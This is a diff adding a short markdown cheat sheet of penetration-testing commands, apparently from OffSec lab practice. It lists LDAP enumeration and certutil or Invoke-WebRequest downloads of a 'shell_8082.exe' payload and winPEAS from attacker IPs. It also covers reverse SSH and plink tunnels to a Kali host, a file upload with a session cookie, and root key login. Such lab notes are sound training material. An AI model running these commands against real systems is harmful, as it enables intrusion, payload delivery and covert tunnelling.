@@ -1,0 +1,45 @@
+## Enumeration
+#### LDAP Enumeration
+```
+ldapsearch -h 192.168.181.122 -p 389 -x -s base
+
+nmap -n -sV --script "ldap* and not brute" 192.168.181.122 -p 389
+
+ldapsearch -h 192.168.181.122 -p 3268 -x -b "dc=hutch,dc=offsec"
+
+```
+------------------------------------
+## File Transfer
+- Certutil
+> certutil -urlcache -split -f http://192.168.49.136/shell_8082.exe C:/Windows/Temp/shell_8082.exe
+
+- Invoke-WebRequest
+> Invoke-WebRequest -Uri "http://192.168.49.181:445/winPEASany.exe" -OutFile "C:\Users\Public\Documents\winPEASany.exe"
+
+-----------------------------------
+## Useful Tricks
+- Curl PUT
+> curl -X PUT "localhost:8080/urlstuffhere" -F "file=@filename" -b "JSESSIONID=cookievalue"
+
+- Add PATH windows
+> set PATH=%SystemRoot%\system32;%SystemRoot%;
+
+- Port Forwarding
+
+  On target machine :
+> ssh -R <Kali-Port>:127.0.0.1:<Service-Port> <Kali_username>@<Kali_IP>
+
+  > sudo service ssh start
+
+  windows
+  > .\plink.exe root@192.168.1.6 -R 445:127.0.0.1:445
+
+- Use of Private Key (id_rsa)
+>  chmod 600 root_key
+
+  >  ssh -i root_key root@192.168.0.1
+
+- ^M bad interpreter removal
+> sed -i -e "s/^M//" <nama file>
+
+-
